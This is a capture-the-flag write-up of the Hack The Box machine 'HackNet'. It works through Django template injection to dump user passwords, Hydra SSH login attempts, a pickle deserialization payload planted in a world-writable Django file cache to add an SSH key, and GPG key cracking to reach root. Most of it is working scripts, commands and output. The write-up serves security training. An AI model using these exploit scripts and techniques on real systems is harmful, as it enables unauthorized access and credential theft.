---
title: "HTB: HackNet"
# description: ""
date: "2026-01-08 11:33:00 +0800"
categories: [hackthebox,linux]
tags: [django,ssti,python-scripts,hydra,django_cache,deserialization,pickle,gnupg,gpg]
pin: false
math: true
mermaid: true
image_path: assets/md_images
image:
  path: assets/md_images/hacknet.png

---

**HackNet is a medium Linux box. Exploit an SSTI flaw in a Django social site to leak user credentials and gain SSH access. Escalate by abusing Django's FileBasedCache (Pickle deserialization) for cache poisoning, then recover GPG keys to decrypt database backups and obtain root.**

---


## <span style="color:lightblue">Recon</span>
### <span style="color:lightgreen">Initial Scanning</span>
`nmap` finds two open TCP ports, SSH (22) and HTTP (80):

```console
$ sudo nmap -sC -sV 10.10.11.85

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 95:62:ef:97:31:82:ff:a1:c6:08:01:8c:6a:0f:dc:1c (ECDSA)
|_  256 5f:bd:93:10:20:70:e6:09:f1:ba:6a:43:58:86:42:66 (ED25519)
80/tcp open  http    nginx 1.22.1
|_http-title: Did not follow redirect to http://hacknet.htb/
|_http-server-header: nginx/1.22.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.86 seconds
```
The webserver is redirecting to `hacknet.htb`. Add this to hosts file:
```console
$ sudo vi /etc/hosts
10.10.11.85 hacknet.htb
```

### <span style="color:lightgreen">Look at website - http 80</span>
Wappalyzer show the webframwork is `Django`, and the site is a social network for hackers:
![Desktop View](assets/md_images/site1-hacknet.png){: .w-75 .rounded-10 w='1212' h='668' }

We can signup a account, and logging in leads to `/profile`. Given that this is a Python webserver, We should check for template injection.


## <span style="color:lightblue">Foothold</span>

### <span style="color:lightgreen">SSTI</span>
We can make a post content with &#123;&#123; 7*7 &#125;&#125; :
![Desktop View](assets/md_images/site2-hacknet.png){: .w-75 .rounded-10 w='1212' h='668' }

But doesn't have SSTI, we can clicked the likes button:
![Desktop View](assets/md_images/site3-hacknet.png){: .w-75 .rounded-10 }

---

We also change username to &#123;&#123; 7*7 &#125;&#125; , testing SSTI in `/profile/edit`:
![Desktop View](assets/md_images/site4-hacknet.png){: .w-75 .rounded-10 w='1212' h='668' }

When we click the likes button, it crashes with 'Something went wrong…' because this payload errors with Django Templates — this indicates SSTI.

![Desktop View](assets/md_images/site6-hacknet.png){: .w-75 .rounded-10 }

Also in `/explore` can see the error 'Something went wrong…':

![Desktop View](assets/md_images/site7-hacknet.png){: .w-75 .rounded-10 }

### <span style="color:lightgreen">Django SSTI</span>

Let's try some Django SSTI [payload](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/Python.md#django), but most of them crash the page when submitting. The only working payload is shown below.

![Desktop View](assets/md_images/ssti2-hacknet.png){: .w-75 .rounded-10 w='1212' h='668' }

After clicking and intercepting the `likes` button request, we can see the payload works.
![Desktop View](assets/md_images/ssti-hacknet.png){: .w-75 .rounded-10 w='1212' h='668' }


When a site renders a page, it passes variables like &#123;&#123; variables &#125;&#125; to the templating engine to generate HTML. Let's write a Python script to brute-force the variables — first, intercept the `/profile/edit` request to gather the necessary request details.

![Desktop View](assets/md_images/edit-hacknet.png){: .w-75 .rounded-10 w='1212' h='668' }

### <span style="color:lightgreen">Brute-force the template variables</span>
Python script to brute-force the template variables. Make sure to replace the cookie tokens with your own.
```python
#enum.py
import requests

base_url = "http://hacknet.htb"
edit_profile = "/profile/edit"
check_string = "/likes/29"
cookies = {
    "csrftoken": "iuzN308DrLexRlvEEXFClKqls4IBxoTz",
    "sessionid": "ij5l5huuqz7fvg92goqs8c6ahjn4bsso"
}

def check_variable(var_name: str) -> bool:
    url = f"{base_url}{edit_profile}"
    data = {
        "csrfmiddlewaretoken": "DVWRLYynpXAOaOsgJhXpP8qke7mA9RhCLfluEOwQGyEbRZNKd4sROIGvw1U1w5O1",
        "username": "{{" + var_name + "}}",
        "email": "",
        "password": "",
        "about": "",
        "is_public": "on"
    }
    
    response = requests.post(url, data=data, cookies=cookies)
    if response.status_code != 200:
        raise Exception("rename user failed")
    url = f"{base_url}{check_string}"
    response = requests.get(url, cookies=cookies)
    
    if 'title=""' in response.text:
        return False
    if "Something went wrong" in response.text:
        return False
    return True

if __name__ == "__main__":
    wordlist_path = "/opt/SecLists/Discovery/Web-Content/api/objects-lowercase.txt"
    try:
        for line in open(wordlist_path):
            l = line.strip()
            if check_variable(l):
                print(f"[+] Found variable: {l}")
    except FileNotFoundError:
        print(f"[-] Error: Dictionary file not found at {wordlist_path}")
```

Run it:
```console
$ python3 enum.py
[+] Found variable: messages
[+] Found variable: user
[+] Found variable: users
```

We found three variables. By changing the username to &#123;&#123; users &#125;&#125; and intercepting the likes button request, we gain access to a Django QuerySet of users objects:
![Desktop View](assets/md_images/ssti-3-hacknet.png){: .w-75 .rounded-10 w='1212' h='668' }

### <span style="color:lightgreen">Dump the users information</span>

The QuerySet `values()` function returns dictionaries instead of model instances. By changing the username to  &#123;&#123; users.values &#125;&#125; and intercepting the likes request on `/explore`, we can dump a large amount of users information.


![Desktop View](assets/md_images/likes1-hacknet.png){: .w-75 .rounded-10 w='1212' h='668' }


Dump a large amount of users information:
![Desktop View](assets/md_images/likes-hacknet.png){: .w-75 .rounded-10 w='1212' h='668' }

Update the script to accept an optional post ID (`/like/{post_id}`), dump the response, and extract email, username, and password information.

```python
import requests, ast
from bs4 import BeautifulSoup

base_url = "http://hacknet.htb"
edit_profile = "/profile/edit"
check_url = "/likes/29"
check_string = "/profile/27"
cookies = {
    "csrftoken": "iuzN308DrLexRlvEEXFClKqls4IBxoTz",
    "sessionid": "ij515huugz7fvg92gogs8c6ahjn4bsso"
}

def check_variable(var_name: str) -> bool:
    url = f"{base_url}{edit_profile}"
    data = {
        "csrfmiddlewaretoken": "DVWRLYynpXA0aOsgJhXpP8qke7mA9RhCLfluEOwQGyEbRZM...", 
        "username": "{{" + var_name + "}}",
        "email": "",
        "password": "",
        "about": "",
        "is_public": "on"
    }
    
    response = requests.post(url, data=data, cookies=cookies)
    if response.status_code != 200:
        raise Exception("rename user failed")
    url = f"{base_url}{check_url}"
    response = requests.get(url, cookies=cookies)
    if 'title=""' in response.text:
        return False
    if "Something went wrong" in response.text:
        return False
    return True

def dump_user(page_id: int):
    url = f"{base_url}/likes/{page_id}"
    response = requests.get(url, cookies=cookies)
    if check_string not in response.text:
        requests.get(f"{base_url}/like/{page_id}", cookies=cookies)
        response = requests.get(url, cookies=cookies)
    soup = BeautifulSoup(response.text, 'html.parser')
    link = soup.find("a", href=check_string)
    
    if not link:
        raise Exception("Could not find user link")
    img = link.find_next("img")
    return ast.literal_eval(img.attrs['title'][10:-1])

if __name__ == "__main__":
    output = {}
    for i in range(1, 30):
        try:
            users = dump_user(i)
            for user in users:
                output[user['id']] = user
        except Exception as e:
            print(f"Failed to dump user {i}: {e}")
            
    for u in output.values():
        print(f"{u['email']}\t{u['username']}\t{u['password']}")
```
Do it:
```console
$ python3 dump.py | tee output.txt
..snip..
datadive@darkmail.net:datadive:D@taD1v3r
codebreaker@ciphermail.com:codebreaker:C0d3Br3@k!
netninja@hushmail.com:netninja:N3tN1nj@2024:False
darkseeker@darkmail.net:darkseeker:D@rkSeek3r#
trojanhorse@securemail.org:trojanhorse:Tr0j@nH0rse!
exploit_wizard@hushmail.com:exploit_wizard:Expl01tW!zard
brute_force@ciphermail.com:brute_force:BrUt3F0rc3#
root@ippsec.rocks:{{ users.values }}:password
hexhunter@ciphermail.com:hexhunter:H3xHunt3r!
rootbreaker@exploitmail.net:rootbreaker:R00tBr3@ker#
packetpirate@exploitmail.net:packetpirate:P@ck3tP!rat3
stealth_hawk@exploitmail.net:stealth_hawk:St3@lthH@wk
whitehat@darkmail.net:whitehat:Wh!t3H@t2024
virus_viper@securemail.org:virus_viper:V!rusV!p3r2024
cyberghost@darkmail.net:cyberghost:Gh0stH@cker2024
shadowcaster@darkmail.net:shadowcaster:Sh@d0wC@st!
bytebandit@exploitmail.net:bytebandit:Byt3B@nd!t123
shadowmancer@cypherx.com:shadowmancer:Sh@d0wM@ncer
phreaker@securemail.org:phreaker:Phre@k3rH@ck
shadowwalker@hushmail.com:shadowwalker:Sh@dowW@lk2024
cryptoraven@securemail.org:cryptoraven:CrYptoR@ven42
glitch@cypherx.com:glitch:Gl1tchH@ckz
deepdive@hacknet.htb:deepdive:D33pD!v3r
mikey@hacknet.htb:backdoor_bandit:mYd4rks1dEisH3re
```
The format is `email:username:password`. Extract the 1st column (Email) and 3rd column (Password), then save the results to `creds.txt`.
```console
$ cat output.txt | awk -F: '{print $1":"$3}' >> creds.txt
```
Strip the domain portion from each Email in creds.txt (removing everything from @ to :) leaving only the username:
```console
$ sed 's/@.*:/:/g' creds.txt
```

## <span style="color:lightblue">Shell as mikey</span>
Use Hydra to test the credentials against the SSH service:
```console
$ hydra -C creds.txt ssh://10.10.11.85
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-01-14 11:52:49
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 56 login tries, ~4 tries per task
[DATA] attacking ssh://10.10.11.85:22/

[22][ssh] host: 10.10.11.85   login: mikey   password: mYd4rks1dEisH3re
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-01-14 11:53:07
```


We can ssh in `mikey` and get user flag:
```
$ ssh mikey@hacknet.htb
mikey@hacknet:~$ cat user.txt
8c74ba19************************
```


## <span style="color:lightblue">Shell as sandy</span>
### <span style="color:lightgreen">Enumeration</span>
We can find django_cache in `/var/tmp`, and the directory is world-writable.
```console
mikey@hacknet:/var/tmp/$ ls -la
drwxrwxrwx 2 sandy www-data 4096 Jan  9 11:05 django_cache
..snip..
```

### <span style="color:lightgreen">Cache Deserialization</span>

We can refer to [django-filebased-cache-rce](https://github.com/abelreqma/django-filebased-cache-rce):

![Desktop View](assets/md_images/cache-hacknet.png){: .w-75 .rounded-10 w='1212' h='668' }


Determine where the Caching Logic is Applied: 
```
mikey@hacknet:/var/www/HackNet$ grep -R '@cache' .
./SocialNetwork/views.py:@cache_page(60)
```
#### Exploit

I’ll write a simple Python deserialization script,This will create a pickled payload that will write my SSH key to sandy’s home directory:
#### ssh-keygen
```
$ ssh-keygen -t ed25519 -f id_ed25519
$ chmod 600 id_ed25519 
$ cat id_ed25519.pub 
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMefTW4vR5bSxxWT/buaRkAIBuAi8msqUj+CpBF9iKLY willy@snow
```

#### Python deserialization script
```python
import pickle
import subprocess
from pathlib import Path

class Exploit:
    def __reduce__(self):
        return (subprocess.Popen, (["/bin/bash", "-c", "mkdir -p /home/sandy/.ssh; echo -e '\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMefTW4vR5bSxxWT/buaRkAIBuAi8msqUj+CpBF9iKLY willy@snow\n' >> /home/sandy/.ssh/authorized_keys"],))
payload = pickle.dumps(Exploit())

for f in Path('/var/tmp/django_cache').iterdir():
    if f.is_file() and f.suffix == ".djcache":
        f.rename(f"{f}.bk")
        f.write_bytes(payload)
        print(f"Poisoned {f}")
```
Run it:

```
mikey@hacknet:/dev/shm$ python3 exploit.py 
Poisoned /var/tmp/django_cache/1f0acfe7480a469402f1852f8313db86.djcache
Poisoned /var/tmp/django_cache/90dbab8f3b1e54369abdeb4ba1efc106.djcache
```

I’m able to SSH as sandy:
```
$ ssh -i ~/keys/ed25519_gen sandy@hacknet.htb
sandy@hacknet:~$
```

## <span style="color:lightblue">Shell as root</span>
### <span style="color:lightgreen">Enumeration</span>
There’s a `.gnupg` directory in sandy’s home directory:
```console
sandy@hacknet:~$ ls -la
total 40
drwx------ 7 sandy sandy    4096 Jan  9 11:39 .
drwxr-xr-x 4 root  root     4096 Jul  3  2024 ..
lrwxrwxrwx 1 root  root        9 Sep  4 15:01 .bash_history -> /dev/null
-rw-r--r-- 1 sandy sandy     220 Apr 23  2023 .bash_logout
-rw-r--r-- 1 sandy sandy    3526 Apr 23  2023 .bashrc
drwxr-xr-x 3 sandy sandy    4096 Jul  3  2024 .cache
drwx------ 3 sandy sandy    4096 Dec 21  2024 .config
drwx------ 4 sandy sandy    4096 Sep  5 07:33 .gnupg
..snip..
```
Also in `/var/www/HackNet/backups` have `.gpg` file:
```console
sandy@hacknet:/var/www/HackNet/backups$ ls
backup01.sql.gpg  backup02.sql.gpg  backup03.sql.gpg
```
### <span style="color:lightgreen">gnupg/gpg</span>
I can list keys in sandy’s account:
```
sandy@hacknet:~$ gpg --list-keys
/home/sandy/.gnupg/pubring.kbx
------------------------------
pub   rsa1024 2024-12-29 [SC]
      21395E17872E64F474BF80F1D72E5C1FA19C12F7
uid           [ultimate] Sandy (My key for backups) <sandy@hacknet.htb>
sub   rsa1024 2024-12-29 [E]
```
The keys are stored in `.gnupg/private-keys-v1.d`, and `armored_key.asc` is the export of the private key.
```
sandy@hacknet:~$ ls .gnupg/private-keys-v1.d/
0646B1CF582AC499934D8503DCF066A6DCE4DFA9.key  armored_key.asc  EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
```

#### Crack Password 
I’ll copy & paste of `armored_key.asc` to my host and use `gpg2john` with a little bit of `sed` to hashcat format:
```console
$ gpg2john armored_key.asc | sed 's/^[^:]*://; s/:::.*//' | tee armored_key.asc.hash

File armored_key.asc
$gpg$*1*348*1024*db7e6d165a1d86f43276a4a61a9865558a3b67dbd1c6b0c25b960d293..snip..
```
Crack with hashcat:
```
$ hashcat armored_key.asc /opt/SecLists/rockyou.txt
hashcat (v7.1.2) starting in autodetect mode
...[snip]...
17010 | GPG (AES-128/AES-256 (SHA-1($pass))) | Private Key
$gpg$*1*348*1024*db7e6d165a1d86f43276a4a6.....b6e35f0058b:sweetheart
...[snip]...
```

### <span style="color:lightgreen">Decrypt .gpg files</span>
```console
sandy@hacknet:/var/www/HackNet/backups$ gpg --decrypt backup01.sql.gpg > /dev/shm/backup01.sql
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
sandy@hacknet:/var/www/HackNet/backups$ gpg --decrypt backup02.sql.gpg > /dev/shm/backup02.sql
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
sandy@hacknet:/var/www/HackNet/backups$ gpg --decrypt backup03.sql.gpg > /dev/shm/backup03.sql
gpg: encrypted with 1024-bit RSA key, ID FC53AFB0D6355F16, created 2024-12-29
      "Sandy (My key for backups) <sandy@hacknet.htb>"
```

Use grep to find password, and find the root password:
```console
sandy@hacknet:/dev/shm$ grep -i password *.sql
> (47,'2024-12-29 20:29:36.987384','Hey, can you share the MySQL root password with me? I need to make some changes to the database.',1,22,18),
> (48,'2024-12-29 20:29:55.938483','The root password? What kind of changes are you planning?',1,18,22),
> (49,'2024-12-29 20:30:14.430878','Just tweaking some schema settings for the new project. Won’t take long, I promise.',1,22,18),
> (50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.',1,18,22),
> (51,'2024-12-29 20:30:56.880458','Got it. Thanks a lot! I’ll let you know as soon as I’m finished.',1,22,18),
..snip..
```

### <span style="color:lightgreen">ssh root</span>
```console
$ sshpass -p h4ck3rs4re3veRywh3re99 ssh root@hacknet.htb
root@hacknet:~# cat root.txt
2be15c53************************

```
